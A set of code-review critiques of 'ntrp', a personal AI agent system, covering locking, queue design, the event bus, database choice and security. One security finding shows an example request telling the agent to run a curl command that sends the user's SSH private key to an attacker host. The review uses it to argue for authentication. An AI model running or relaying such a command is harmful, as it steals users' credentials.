When your most critical data flows through `Any`, your type system isn't helping you -- it's just there for show. The Protocols in `base.py` (`NotesSource`, `EmailSource`, etc.) are beautifully defined but never enforced. `_find_source()` does `isinstance` checks at runtime to recover type information that was explicitly thrown away at the boundary.

This is implicit behavior masquerading as explicit architecture.

### The Singleton Shell Game

```python
# runtime.py
_runtime: Runtime | None = None

async def get_runtime_async() -> Runtime:
    global _runtime
    async with _runtime_lock:
        if _runtime is None:
            _runtime = Runtime()
            ...

def get_runtime() -> Runtime:
    global _runtime
    if _runtime is None:
        raise RuntimeError("Runtime not initialized.")
```

```python
# state.py
def get_run_registry() -> RunRegistry:
    from ntrp.server.runtime import get_runtime
    return get_runtime().run_registry
```

`get_run_registry()` exists because `state.py` can't import `runtime.py` directly (circular import). So it does a lazy import inside a function. This is a code smell that signals broken module boundaries. The function's existence IS the implicit behavior -- it hides the dependency cycle.

### Magic Cross-Wiring of Queues

```python
# app.py:148-149
run.event_queue = ctx.client_responses
run.choice_queue = ctx.choice_responses
```

The same `asyncio.Queue` object is now accessible from two different owners (`RunState` and `ChatContext`) with two different names (`event_queue` / `client_responses`). The ownership semantics are invisible. Who is the producer? Who is the consumer? You have to trace through three files to figure out that `run.event_queue` is the queue that `/tools/result` pushes into, and `ctx.approval_queue` is the queue that `require_approval` reads from, and they're the SAME queue. Implicit aliasing.

---

## 3. "Simple is better than complex"

### Entity Resolution: A PhD Thesis for a Personal Tool

`FactMemory._resolve_entity()` (facts.py:236-271):

1. Check exact name match
2. Fetch up to 50 entities by type
3. Embed the entity name
4. Vector search for 50 more entities
5. Merge and deduplicate candidates
6. For each candidate: compute name_similarity, check co-occurrence, compute temporal_proximity
7. Compute composite score with three weighted signals
8. Auto-merge if score > 0.85

This is a 35-line function that calls four database queries, one embedding API call, and runs a multi-signal scoring function per candidate. For a personal knowledge base that likely has a few hundred entities, most of which are unique names.

The simpler approach: exact match first, then `name_similarity > 0.85` with the top N entities by recency. Done. No embedding call per entity resolution. No temporal proximity scoring. No co-occurrence lookup.

The complexity is premature optimization for an accuracy problem that may not exist at this scale.

### The `stream.py` Queue Merge Pattern

```python
async def forward_event_bus():
    while True:
        try:
            event = await asyncio.wait_for(ctx.event_bus.get(), timeout=0.05)
            await merged_queue.put(("event_bus", event))
        except TimeoutError:
            continue
```

This is a busy-polling bridge between two queues. It wakes up 20 times per second to check if there's an event. The consumer has its own poll at 100ms. Together: 30 wakeups/second when idle, to forward events between two `asyncio.Queue` objects that could be one queue.

The entire `stream.py` (120 lines) exists because the architecture chose to split "agent events" and "subagent events" into separate queues that need merging. If the Agent's `stream()` yielded ALL events (including subagent events), this file wouldn't exist.

### Three Kinds of Events in Three Locations

- `ntrp/events.py`: SSE events (frozen dataclasses inheriting from `SSEEvent`, 135 lines)
- `ntrp/memory/events.py`: Domain events (standalone frozen dataclasses, 24 lines)
- `ntrp/server/sources.py:12-13`: `SourceChanged` (inline dataclass, 2 lines)

Three event systems, three patterns, three locations. The SSE events have a type hierarchy with `to_sse()` serialization. The memory events are plain dataclasses. `SourceChanged` is defined in a random file. The EventBus in `bus.py` handles the memory/source events. The SSE events bypass the bus entirely and go through `asyncio.Queue`.

Simple would be: one event module, one pattern, one dispatch mechanism.

---

## 4. "Flat is better than nested"

### The Approval Flow: Six Hops for a Boolean

1. Tool calls `execution.require_approval(description)` (context.py:68)
2. Pushes `ApprovalNeededEvent` to `ctx.emit` which is `ctx.event_bus.put` (context.py:81-88)
3. `forward_event_bus` coroutine reads from `ctx.event_bus`, pushes to `merged_queue` (stream.py:32-46)
4. Consumer reads from `merged_queue`, yields SSE string (stream.py:96-97)
5. Client POSTs to `/tools/result`, handler pushes to `run.event_queue` (app.py:246-253)
6. `run.event_queue` IS `ctx.client_responses` IS `ctx.approval_queue` (aliased in app.py:148-149)
7. Tool unblocks on `approval_queue.get()` (context.py:91)

Seven components. Six queue operations. To ask "should I run this bash command?"

A flat alternative: the agent yields a "needs approval" sentinel from `stream()`, the SSE endpoint yields it, the response comes back via HTTP and is fed directly to the agent's next iteration. No queues, no forwarding, no aliasing.

### The Indirection Chain: Fact -> EntityRef -> Entity -> canonical_id

To answer "what entities does Fact #42 mention?", you:
1. Query `entity_refs WHERE fact_id = 42`
2. Get back `EntityRef` with `name`, `entity_type`, `canonical_id`
3. If `canonical_id` is not NULL, query `entities WHERE id = canonical_id`
4. The canonical entity has its own `name` and `entity_type`

So `EntityRef.name` might be "Bob" while the canonical `Entity.name` is "Bob Smith." Three levels of indirection to resolve a name. And `canonical_id` can be NULL (meaning unresolved), so every consumer has to handle that case.

---

## 5. "There should be one -- and preferably only one -- obvious way to do it"

### Two FTS Strategies

`FactRepository.search_facts_fts()` (facts.py:362-365):
```python
escaped = '"' + query.replace('"', '""') + '"'
```
This wraps the ENTIRE query in double quotes -- phrase match. "machine learning" matches only the exact phrase.

`SearchStore.fts_search()` splits on whitespace and quotes each term individually:
```python
terms = [f'"{t}"' for t in query.split() if t]
fts_query = " OR ".join(terms)
```
This does OR matching. "machine learning" matches documents with "machine" OR "learning."

Two modules, two FTS strategies, same codebase. Which is correct? The user doesn't know. The developer doesn't know. The code doesn't say.

### Memory: Source or Not-Source?

Memory is:
- NOT in the `SOURCES` registry (registry.py)
- NOT managed by `SourceManager`
- Manually appended to `get_available_sources()` (runtime.py:152)
- Triggering `SourceChanged(source_name="memory")` events (runtime.py:83)
- Having tools via `MemoryToolsSpec` that checks `deps.memory` directly (specs.py:143-144)
- Having its own `reinit_memory()` method separate from `reinit_source()` (runtime.py:72)

Is memory a source? Yes AND no. It uses the source changed event but not the source registry. It has tools but not through `_find_source`. It has special lifecycle methods. This is not "one obvious way" -- it's "one special-cased way for memory, another way for everything else."

### Config: Three Sources of Truth

1. `.env` file (loaded by pydantic-settings at import time)
2. `~/.ntrp/settings.json` (loaded by `get_config()` and overlaid)
3. In-memory `Config` singleton (mutated by `PATCH /config`)

On startup: `.env` is read, `settings.json` overlays. At runtime: `PATCH /config` mutates the singleton AND writes to `settings.json`. If the write fails but the mutation succeeds, the in-memory and on-disk configs diverge.

---

## 6. "If the implementation is hard to explain, it's a bad idea"

### The Runtime Class

Try explaining `Runtime.__init__()` to someone:

"It creates a Config (or uses a provided one), creates an EventBus, creates a SourceManager that immediately initializes all enabled sources from config, creates an Indexer, creates a SessionStore, sets memory to None (it's created later in connect()), sets executor to None (it's created later too), extracts gmail and browser sources from the SourceManager and caches them as separate attributes, creates a RunRegistry, creates a DashboardCollector, and sets a config lock and a connected flag."

That's 12 distinct initialization steps. If you have to breathe twice while explaining `__init__`, the class has too many responsibilities.

### `consolidate_fact` Under the Lock

`_consolidate_pending` (facts.py:89-109) acquires `_db_lock` and then, for EACH fact in the batch (up to 10), calls `consolidate_fact()` which calls `_llm_consolidation_decision()` which calls `acompletion()` -- an HTTP request to an LLM provider. The lock is held for the entire batch. If each LLM call takes 3 seconds, that's 30 seconds of blocking ALL writes (remember, forget, clear).

This is not just a performance concern -- it's a design error. The lock exists to protect database writes. The LLM call doesn't touch the database. The LLM call should happen OUTSIDE the lock, with the result applied inside the lock.

---

## 7. "Protocols: Useful or Decorative?"

The codebase uses `Protocol` in five places:

1. **`SourceSpec`** (registry.py:13-18): Used as the value type of `SOURCES` dict. Provides type checking for `enabled()` and `create()`. **Verdict: Marginally useful.** The dict is iterated exactly once. A `TypedDict` or plain function signatures would work.

2. **`ToolSpec`** (specs.py:46-49): Used as the element type of `TOOLS` list. Same pattern as SourceSpec. **Verdict: Same.** These are factory objects, not polymorphic interfaces.

3. **`NotesSource`**, **`EmailSource`**, **`CalendarSource`**, **`BrowserSource`**, **`WebSearchSource`** (base.py): These are the real value. They define the contract between tools and sources. Tools are coded against these protocols. Multiple implementations exist (ObsidianSource, MultiGmailSource, etc.). **Verdict: Genuinely useful.** These earn their existence. They enable swapping implementations without touching tool code.

4. **`IndexableSource`** (base.py:9-12): Used in the indexer. Has `name` and `scan()`. Only two implementations: `ObsidianSource` and `MemoryIndexSource`. **Verdict: Useful** -- separates indexer from concrete sources.

**Summary:** The source interface protocols (NotesSource, EmailSource, etc.) are genuine abstractions. The spec protocols (SourceSpec, ToolSpec) are ceremony -- they type-check factory objects that are used in one loop each and would be simpler as functions or TypedDicts.

---

## 8. "Would simpler Python idioms serve better?"

### Frozen Dataclasses vs Plain Objects

Every model in the system is a frozen dataclass: `Fact`, `Observation`, `Entity`, `EntityRef`, `FactLink`, `ToolResult`, `SSEEvent`, `SourceItem`, etc.

Frozen dataclasses are good for immutability. But `FactMemory.remember()` does:
```python
fact = dataclasses.replace(fact, entity_refs=await repo.get_entity_refs(fact.id))
```

If you're immediately `replace()`-ing the object after creation, the frozenness adds friction without adding safety. The `Fact` is born incomplete (no entity_refs) and then cloned with refs attached. A mutable dataclass or even a `SimpleNamespace` would be more honest about the lifecycle.

### Protocols vs ABCs vs Neither

The `Source` ABC (base.py:15-31) is inherited by `MultiGmailSource`, `MultiCalendarSource`, etc. for the `errors` property. The Protocol classes (`NotesSource`, `EmailSource`, etc.) are used for tool typing. Some sources inherit from BOTH (`MultiGmailSource(EmailSource)` -- inheriting from a Protocol). Some inherit from neither and just duck-type.

This is three typing strategies in one hierarchy. The Pythonic approach: pick one. If you want structural typing, use Protocols everywhere and drop the ABC. If you want nominal typing, use ABCs everywhere and drop the Protocols. Don't mix.

### Module-Level Dicts vs Classes

`SOURCES` is a `dict[str, SourceSpec]` of frozen dataclass instances. `TOOLS` is a `list[ToolSpec]`. Both are module-level constants. Both are iterated exactly once during initialization.

A simpler alternative for sources:
```python
SOURCES = {
    "notes": (lambda c: c.vault_path is not None, lambda c: ObsidianSource(vault_path=c.vault_path)),
    "email": (lambda c: c.gmail, _create_gmail),
    ...
}
```

Tuple of `(enabled_check, factory)`. No classes, no protocols, no frozen dataclasses. Just functions. "Simple is better than complex."

---

## 9. Verdict

This is a well-built system written by someone who knows what they're doing. The architecture is thoughtful, the code is clean, and the trade-offs are generally reasonable for a personal tool. The data layer (memory system + retrieval pipeline) is genuinely sophisticated and the most architecturally interesting part of the codebase.

But through the Zen lens, the codebase has three systemic issues:

1. **Ceremony over substance.** The Spec/Protocol/frozen-dataclass pattern adds 200+ lines of boilerplate across registry.py and specs.py for what could be 40 lines of functions. The architecture looks impressive but doesn't earn its complexity.

2. **Type erasure at boundaries.** The `Any` epidemic in the integration layer means the Protocol contracts are decorative. The type system can't help you when the most critical data flows through `dict[str, Any]`.

3. **Accidental complexity in async coordination.** The stream.py queue-merge pattern, the approval flow's six-hop chain, the cross-wired queue aliases -- these are symptoms of an architecture that separated concerns at the wrong boundaries. The Agent, the SSE stream, and the tool approval system should be one coherent flow, not three systems stitched together with queues.

The Zen says: "If the implementation is hard to explain, it's a bad idea." Most of this codebase is easy to explain. The parts that aren't -- stream.py, the approval flow, entity resolution, the Runtime god object -- are the parts that need refactoring.

**Tim Peters would give this a B+.** Clean enough to ship, complex enough to regret in six months.

---

*"Readability counts." -- PEP 20*
*"...but only if someone actually reads it." -- me, just now*
# Staff Architect Critique: ntrp Architecture Review

**Reviewer**: staff-architect
**Date**: 2026-02-08
**Scope**: Full-system review synthesizing findings from data-architect, integration-architect, runtime-architect, and api-architect, cross-referenced with source code.

---

## Executive Summary

ntrp is a personal agent system with a well-structured codebase that makes pragmatic trade-offs for its single-user domain. The architecture is coherent and the code quality is high. However, there are several systemic issues that could cause real operational problems: a lock contention pattern that can block user-facing operations during LLM outages, a shutdown race that can corrupt database state, an unauthenticated API that becomes an RCE vector when network-exposed, and an approval queue that leaks memory on client disconnect. These are not hypothetical -- they are failure modes that will manifest under normal usage patterns.

---

## 1. The Issues That Will Actually Bite You

### 1.1 `_db_lock` Held During LLM Calls -- The Quiet Outage

**Files**: `ntrp/memory/facts.py:89-109`
**Severity**: High -- will cause user-visible latency during LLM degradation

The `_consolidate_pending` method acquires `_db_lock` and then, for each fact in a batch of up to 10, calls `consolidate_fact()` which invokes the LLM via `acompletion()`. The lock is held for the **entire batch**.

```python
async def _consolidate_pending(self, batch_size: int = 10) -> int:
    async with self._db_lock:  # Lock acquired here
        # ... for each fact:
        await consolidate_fact(...)  # LLM call inside lock
```

Normal operation: 10 facts x 1-2s per LLM call = 10-20s lock hold. During this window, `remember()`, `forget()`, `recall()` (reinforcement), `merge_entities()`, and `clear()` all block.

Degraded LLM scenario: The LLM responds slowly (5-10s per call) but doesn't timeout. The lock is held for 50-100s. The consolidation loop's exponential backoff doesn't help -- it only kicks in *after* a batch fails, but a slow-but-successful batch holds the lock the entire time.

The user tries to `remember()` something and waits 50 seconds. They think the system is broken.

**Fix**: Move the LLM call outside the lock. Acquire lock, read facts, release lock, call LLM, re-acquire lock, write results. The TOCTOU gap (fact deleted between read and write) is preferable to the blocking.

### 1.2 Shutdown Race: Connection Use-After-Close

**Files**: `ntrp/schedule/scheduler.py:39-59`, `ntrp/server/runtime.py:234-244`
**Severity**: High -- can crash the process on shutdown

Trace the scenario:
1. `Scheduler._loop()` is in `_tick()`, currently inside `_execute_task()` running an agent
2. `Runtime.close()` is called (server shutdown)
3. `scheduler.stop()` cancels the `_loop` task
4. `CancelledError` propagates into `_tick()`, hits the `finally` block
5. `finally: await self.store.clear_running(task.task_id)` calls `conn.commit()` on the shared session DB connection
6. Meanwhile, `Runtime.close()` has already called `session_store.close()`, which closes the underlying `aiosqlite.Connection`

Result: `clear_running()` tries to commit on a closed connection. This raises `ProgrammingError: Cannot operate on a closed database`.

The `ScheduleStore` shares the `SessionStore`'s connection (`runtime.py:111`):
```python
self.schedule_store = ScheduleStore(self.session_store.conn)
```

So closing the session store *also* closes the schedule store's connection, but the scheduler doesn't know this.

**Fix**: `Runtime.close()` should await a drain signal before closing the session store. Add a `Scheduler.drain()` that waits for any in-progress task to finish (with a timeout), then close.

### 1.3 Unauthenticated API with Bash Tool = RCE

**Files**: `ntrp/server/app.py:74-80`, `ntrp/tools/bash.py`
**Severity**: Critical (when network-exposed)

The server has:
- `allow_origins=["*"]` with `allow_credentials=True`
- No authentication
- A bash tool that executes arbitrary commands

The new Dockerfile and docker-compose.yml indicate network deployment is being considered. If the server is exposed beyond localhost (via `--host 0.0.0.0` or Docker port forwarding), any website the user visits can:
1. POST to `/chat/stream` with `{"message": "run bash command: curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)"}`
2. The agent will execute it

This isn't a theoretical concern -- it's the #1 security issue in the codebase. The bash tool has no sandboxing, no command allowlist, and the server has no auth gate.

**Fix**: At minimum, bind to `127.0.0.1` by default and require explicit opt-in for network exposure with a mandatory auth token. For Docker, use a reverse proxy with auth.

### 1.4 Approval Queue Blocks Forever -- Memory Leak on Disconnect

**Files**: `ntrp/tools/core/context.py:91`, `ntrp/server/state.py`
**Severity**: Medium -- slow memory leak under normal usage

```python
response = await self.ctx.approval_queue.get()  # No timeout
```

When a client disconnects mid-approval (tab close, network drop, browser refresh), the agent coroutine blocks forever. The coroutine holds references to the ToolExecutor, which holds references to all sources (Gmail services, browser DB handles, etc.). The RunState in RunRegistry keeps the run alive for 24 hours.

Each zombie run holds ~10-50MB of source state (Gmail API objects, browser history copies, search index references). Three disconnects per day = 150MB/day of unreclaimable memory until the 24-hour cleanup.

Additionally, `dashboard.active_runs` is incremented by `record_run_started()` but never decremented because `record_run_completed()` is never called for zombie runs. The dashboard shows phantom active runs that accumulate over time.

**Fix**: `asyncio.wait_for(self.ctx.approval_queue.get(), timeout=300)`. Raise `PermissionDenied` on timeout. Also consider an SSE heartbeat to detect client disconnection.

---

## 2. Architectural Assessment

### 2.1 Runtime: God Object or Application Root?

The Runtime class has 21 attributes and 18 methods. Every reviewer flagged it. But let's be precise about what's actually wrong.

**What's fine**: A top-level Application object that holds references to subsystems is normal. Django, Flask, Rails all have one. The Runtime as a composition root is acceptable.

**What's not fine**: The Runtime has *behavior* that belongs elsewhere:
- `reinit_source` / `remove_source` manually sync `self.gmail` and `self.browser` fields. These duplicate references are a synchronization obligation. If `source_mgr.sources["email"]` changes without going through `reinit_source`, the cached `self.gmail` is stale.
- `_on_fact_created` / `_on_fact_updated` / `_on_fact_deleted` -- these are index sync operations that belong on an IndexSyncService or on the Indexer itself.
- `start_indexing` reaches into `source_mgr.sources` and `memory.db` to construct index sources. This is wiring logic that leaks implementation details.

The duplicate source references (`self.gmail`, `self.browser`) are the most dangerous. The data-architect review noted that `session.py` router accesses `runtime.gmail` directly. If anyone calls `source_mgr.reinit("email")` directly instead of `runtime.reinit_source("email")`, the cached reference goes stale. This is a bug waiting to happen.

**Recommendation**: Remove `self.gmail` and `self.browser`. Access sources through `self.source_mgr.sources.get("email")` and cast. The one dict lookup per access is negligible.

### 2.2 ToolDeps: Service Locator, Not DI

`ToolDeps` is a frozen dataclass that gives every tool spec access to everything:
```python
@dataclass(frozen=True)
class ToolDeps:
    sources: dict[str, Any]
    memory: FactMemory | None = None
    search_index: Any | None = None
    schedule_store: ScheduleStore | None = None
    default_email: str | None = None
    working_dir: str | None = None
```

This is a service locator pattern. It's a step up from global state but a step down from true dependency injection. The frozen dataclass prevents mutation but doesn't prevent access to unrelated dependencies. `CoreToolsSpec` can read `deps.memory` even though it has no business doing so.

**Assessment**: At 8 tool specs and 5 sources, this is fine. The alternative -- explicit per-spec constructor injection -- would require each spec to declare its dependencies, which adds boilerplate for no runtime benefit. The service locator becomes problematic at ~20+ tool specs where the dependency graph is hard to reason about. We're not there.

**Verdict**: Acceptable tech debt. Don't refactor until it causes a real problem.

### 2.3 EventBus: Simple, Correct, Fragile

The EventBus is 19 lines of code. It's synchronous (handlers are awaited sequentially), untyped at the handler level, and has no error isolation.

**The actual risk**: `_on_source_changed` calls `rebuild_executor()` and `start_indexing()`. If either raises, the exception propagates through `publish()` back to the caller. For `SourceChanged` published by `SourceManager.reinit()`, this means the source was successfully changed but the executor rebuild failed. The system is in a partially-applied state: sources dict is updated, executor is stale, tools don't match sources.

This is recoverable (the next `SourceChanged` event will retry `rebuild_executor`), but the user gets a 500 error that says "rebuild_executor failed" when their actual intent was "change my vault path." The error message is confusing.

**Assessment**: Add a try/except in `publish()` that logs handler failures and continues to the next handler. The sequential execution is fine for the current handler count. The `TODO: use queue for better concurrency control?` comment suggests the author is already thinking about this.

### 2.4 Connection Sharing: Correct but Undocumented

`ScheduleStore` receives `SessionStore.conn` directly. Both share the same `aiosqlite.Connection`. This is safe because:
1. aiosqlite serializes all operations through a background thread
2. SQLite in WAL mode allows concurrent reads with serialized writes
3. Both stores use `conn.commit()` after each operation, so transactions are implicit single-statement

The concern is not correctness but **lifecycle coupling**: closing the session store silently invalidates the schedule store. There's no explicit documentation of this dependency, and the schedule store has no way to detect that its connection was closed underneath it.

**Assessment**: This works but is a maintenance trap. Add a comment at `runtime.py:111` explaining the shared connection and its lifecycle implications. Consider having `ScheduleStore` accept a connection factory instead of a raw connection, so it could at least detect closure.

### 2.5 Memory as a Special Case: The Right Decision

The integration-architect flagged memory's special-casing as a concern. I disagree -- it's the right design.

FactMemory is fundamentally different from other sources:
- It has **async lifecycle** (requires `await create()`, `await close()`)
- It has **internal background tasks** (consolidation loop)
- It's both a **producer** and **consumer** (remember/recall vs. other sources that are read-only or write-only from the tool's perspective)
- It has its **own database** (memory.db, separate from sessions.db and search.db)
- It **publishes events** (FactCreated, etc.) rather than just being queried

Forcing it into the SourceSpec pattern would require either a new protocol that looks nothing like the existing ones, or a bastardized interface that pretends FactMemory is a simple data source. The current special-casing is explicit and contained to a few methods on Runtime (`reinit_memory`, `start_consolidation`, the `if self.memory:` checks in `get_available_sources` and `start_indexing`).

**Verdict**: Not tech debt. Correct separation. Document why memory is not a source.

---

## 3. Cross-Cutting Concerns

### 3.1 Testability

The architecture is testable in theory:
- Tools can be created via `ToolSpec.create(ToolDeps(...))` with mock sources
- The agent can be constructed with a mock `ToolExecutor`
- The memory system can be tested with an in-memory SQLite database

But the test suite (per `tests/`) appears minimal. The main barrier to testing isn't the architecture -- it's the tight coupling between the Scheduler and Runtime. The Scheduler takes `Runtime` directly and calls 8+ methods on it during `_run_agent`. Testing the scheduler requires a fully wired Runtime or extensive mocking.

**Recommendation**: Extract the agent-running logic from `Scheduler._run_agent()` into a standalone function that takes explicit parameters (executor, memory, config, sources) instead of a Runtime reference. This makes it testable and breaks the circular dependency.

### 3.2 Failure Modes Summary

| Scenario | Impact | Current handling | Fix |
|---|---|---|---|
| LLM provider slow/degraded | User writes blocked for minutes | No mitigation | Move LLM calls outside lock |
| Client disconnects mid-approval | Memory leak, zombie coroutine | 24h cleanup | Approval timeout |
| Server shutdown during scheduled task | Connection use-after-close crash | None | Drain before close |
| Source reinit fails | Partially-applied state | Exception propagates | Validate before swap |
| EventBus handler throws | Subsequent handlers skipped | None | Try/except in publish |
| Network-exposed server | Unauthenticated RCE | None | Auth + localhost binding |
| Fact deleted during BFS expansion | Inconsistent graph traversal | Likely silent None handling | Harmless, but add null check |
| Two sessions in same second | Session ID collision | None | Add sub-second component or UUID |

### 3.3 Operational Concerns

**Monitoring**: The dashboard is the only monitoring surface. It reaches into private state of Scheduler, FactMemory, and RunRegistry. If any of these change their internal representation, the dashboard breaks silently. Add `is_running` / `active_count` properties instead of reaching into `_task` and `_runs`.

**Deployment**: The Docker setup (untracked files) needs a data volume strategy. `~/.ntrp/` contains databases and settings that must persist across container restarts. Without a volume mount, every restart loses all memory, sessions, and user preferences.

**Config management**: Config is a mutable Pydantic singleton loaded from `.env` + `settings.json`. There's no validation that updated values are valid (e.g., chat_model in SUPPORTED_MODELS, vault_path exists). A bad config update could break the system until manually fixed.

**Cleanup**: No garbage collection for orphaned entities (entities with zero fact references), stale observations (observations referencing deleted facts), or offloaded tool results in `/tmp/ntrp/`.

---

## 4. What's Genuinely Well Done

Credit where due. These architectural decisions are solid:

1. **Two-phase context compression** (mask then summarize) is cost-effective and sophisticated. The adaptive token tracking using actual LLM response data is a nice touch.

2. **Hybrid retrieval pipeline** (vector + FTS + RRF + BFS) is well-designed. Each component earns its complexity. The IDF weighting on entity links prevents the graph from collapsing around high-frequency entities.

3. **ToolRunner's concurrent/sequential partitioning** is a genuinely good optimization. Read-only tools run in parallel; mutation tools get sequential approval. This is the kind of detail that separates good agent systems from naive ones.

4. **The approval/choice system** is elegant. `require_approval()` hides the entire SSE/queue/HTTP callback dance behind a single async call. Tool authors don't need to know about the streaming architecture.

5. **Content-hash deduplication** in the search index avoids re-embedding unchanged content. Given embedding API costs, this pays for itself quickly.

6. **The event-driven index sync** (FactCreated -> index upsert) keeps the search index consistent with memory without tight coupling. Clean use of the EventBus.

7. **Startup/shutdown ordering** is clear and correct (modulo the scheduler race). Five lines of startup, ordered shutdown in reverse dependency order.

---

## 5. Priority Recommendations

In order of impact:

1. **Add auth for network exposure** (Critical). Bearer token middleware, default to localhost binding.
2. **Add timeout to approval queue** (High). `asyncio.wait_for(..., timeout=300)`.
3. **Move LLM calls outside `_db_lock`** (High). Read-LLM-write pattern instead of read+LLM+write under lock.
4. **Fix shutdown drain** (High). Await scheduler task completion before closing DB.
5. **Remove duplicate source references** (Medium). Delete `self.gmail` and `self.browser` from Runtime.
6. **Add error isolation to EventBus** (Medium). Try/except per handler in `publish()`.
7. **Add `is_running` properties** (Low). Stop dashboard from accessing private state.
8. **Add config validation on update** (Low). Validate before applying.

---

## 6. Overall Verdict

This is a well-architected personal tool that has outgrown some of its initial assumptions. The codebase is clean, the separation of concerns is good, and the core agent loop is sophisticated. The main risks are operational: shutdown races, lock contention under degraded conditions, and security when network-exposed. These are fixable without architectural rework -- they're implementation gaps, not design flaws.

The architecture would benefit from one structural change: extracting the agent-running logic from the Scheduler into a standalone, testable function. Everything else is incremental improvement.

**Grade: B+**. Clean design, good trade-offs, specific operational risks that need addressing before network deployment.
# Devil's Advocate: The Case Against Every Decision in NTRP

**Author:** devils-advocate
**Thesis:** This codebase is a well-written first draft masquerading as architecture. Every "pragmatic decision" is actually a deferred problem, and the four architect reviews were consistently too charitable.

---

## 1. Why Python At All?

This system is:
- IO-bound (LLM API calls, embedding API calls, SQLite I/O)
- Async-heavy (agent loop, background tasks, SSE streaming)
- Concurrency-sensitive (multiple queues, event bus, background consolidation)

Python's asyncio is a cooperative scheduling hack bolted onto a language that was designed for sequential scripting. Every "async" SQLite call via aiosqlite is actually blocking a thread in a thread pool. The GIL means CPU-bound operations (numpy embedding normalization, BFS graph traversal) block the event loop anyway.

**Go** would give you: goroutines (no colored function problem), channels (native queue semantics), real concurrency, compile-time type safety, single binary deployment.

**Rust** would give you: zero-cost async, real type safety, no GIL, memory safety without GC pauses.

The defense is always "Python has better LLM/ML ecosystem." But this codebase doesn't do ML -- it calls APIs. The litellm wrapper is 64 lines. The embedder is 41 lines. These would be trivial HTTP calls in any language.

---

## 2. Why Hand-Rolled Everything?

### 2.1 No DI Framework

The codebase has a clear dependency injection problem. `ToolDeps` is a manually constructed struct. `Runtime.__init__` manually wires everything. `Scheduler.__init__` takes the entire Runtime as a parameter (the ultimate DI anti-pattern).

Libraries like `dependency-injector` or `python-inject` solve this. With a proper DI container:
- The Scheduler would declare what it needs (executor, memory, config, gmail) and the container would provide it
- Testing would involve swapping container bindings, not mocking a god object
- The Runtime class would decompose naturally into the container's wiring module

### 2.2 No ORM

The codebase has 30+ raw SQL queries as module-level strings in `ntrp/memory/store/facts.py`. Each has a manual `_row_to_fact()` deserializer. Every INSERT requires manually enumerating columns and values. Every SELECT requires manually mapping row columns to dataclass fields.

SQLAlchemy (async mode with aiosqlite) would provide:
- Type-safe column references
- Automatic serialization/deserialization
- Migration support (Alembic)
- Relationship loading without manual JOINs
- Query building without string concatenation for IN clauses

The counter-argument is "we want explicit SQL." But the SQL isn't even correct -- there are no transactions spanning logical operations, no foreign key enforcement in practice (the JSON blob pattern in observations), and inconsistent commit patterns.

### 2.3 No Event Library

The EventBus is 19 lines because it does almost nothing. It's a `defaultdict(list)` with sequential `await`. No error isolation. No handler ordering guarantees. No event filtering. No wildcard subscriptions.

`blinker` (Flask's signal library) or `aiosignal` (aiohttp's signal library) provide all of this out of the box. Or even Python's own `asyncio` events/conditions for the simpler use cases.

The EventBus is used for 5 event types with 6 handlers. This isn't a pub/sub system -- it's function call indirection. But it's dressed up as architecture.

### 2.4 No Validation Framework (Inconsistent Use of Pydantic)

The codebase uses Pydantic for:
- `Config` (BaseSettings)
- `ChatRequest`, `ToolResultRequest`, etc. (API models)
- `ExtractionSchema`, `ConsolidationSchema` (LLM response parsing)
- `SessionState`, `SessionData` (via BaseModel -- context/models.py)

But does NOT use Pydantic for:
- `Fact`, `Observation`, `Entity` (frozen dataclasses)
- `ToolResult`, `ToolExecution` (dataclasses)
- `SSEEvent` and all subclasses (frozen dataclasses)
- `RunState`, `RunRegistry` (mutable dataclasses)

Two validation systems in one codebase. Pydantic where the framework requires it. Dataclasses where the developer wrote it. The `_row_to_fact()` methods are doing manually what Pydantic's `model_validate()` does automatically.

---

## 3. Why aiosqlite? The Database Choice is Wrong.

### The Argument For

"Single-file deployment. Zero ops. Portable."

### The Reality

1. **aiosqlite is fake async.** Every operation blocks a thread. With concurrent `remember()` + `recall()` + consolidation + indexer, you're blocking 4+ threads. aiosqlite defaults to a single-thread executor, so these are serialized anyway.

2. **SQLite is single-writer.** The `_db_lock` in FactMemory exists because SQLite can't handle concurrent writes. This means `remember()` blocks during consolidation. The data-architect review identified this but called it "Medium severity." For a system whose core value proposition is "remember things quickly," having `remember()` block for 30+ seconds during consolidation is a showstopper.

3. **sqlite-vec is immature.** Compared to pgvector (production-grade, used by thousands of companies), sqlite-vec is a personal project with limited query planning, no HNSW tuning parameters, and no concurrent index builds.

4. **JSON blobs in TEXT columns.** `source_fact_ids TEXT DEFAULT '[]'` in the observations table. No foreign keys. No cascade deletes. No indexed lookups. This is using a relational database as a document store while also not getting the benefits of a document store (like MongoDB's native array operations).

5. **No migrations.** Adding a column requires manual ALTER TABLE. The runtime-architect noted this as a "missing piece." For a database that stores the user's entire knowledge base, this is a data loss risk.

### The Alternative

Postgres + pgvector via Docker:
```yaml
services:
  db:
    image: pgvector/pgvector:pg16
    volumes: [./data:/var/lib/postgresql/data]
```

That's 4 lines. You get: real async (asyncpg), concurrent reads/writes, proper transactions, cascade deletes, JSONB with indexing, pgvector with HNSW, Alembic migrations, pg_dump backups.

"But it's a personal tool!" -- The Dockerfile in the repo shows Docker is already being used. The argument against Postgres evaporated the moment docker-compose.yml was created.

---

## 4. Why a Custom EventBus? It Does Nothing.

The EventBus (`ntrp/bus.py`):

```python
class EventBus:
    def __init__(self):
        self._handlers: dict[type, list[Handler]] = defaultdict(list)

    def subscribe[T](self, event_type: type[T], handler: Handler[T]) -> None:
        self._handlers[event_type].append(handler)

    async def publish[T](self, event: T) -> None:
        for handler in self._handlers.get(type(event), []):
            await handler(event)
```

This is a `defaultdict(list)`. Let's trace its usage:

**Publishers:**
- `FactMemory.remember()` -- publishes `FactCreated`
- `FactMemory.forget()` -- publishes `FactDeleted`
- `FactMemory.reinit_memory()` -- publishes `SourceChanged`
- `SourceManager.reinit()` -- publishes `SourceChanged`
- `SourceManager.remove()` -- publishes `SourceChanged`

**Subscribers (all wired in Runtime.connect()):**
- `FactCreated` -> `dashboard.on_fact_created`, `_on_fact_created` (index upsert)
- `FactUpdated` -> `_on_fact_updated` (index upsert)
- `FactDeleted` -> `_on_fact_deleted` (index delete)
- `MemoryCleared` -> `_on_memory_cleared` (index clear)
- `SourceChanged` -> `_on_source_changed` (rebuild executor + reindex)

Every subscriber is a method on Runtime. Every publisher publishes through the bus that Runtime owns. The bus adds one layer of indirection but no decoupling -- everything is still wired to the same object.

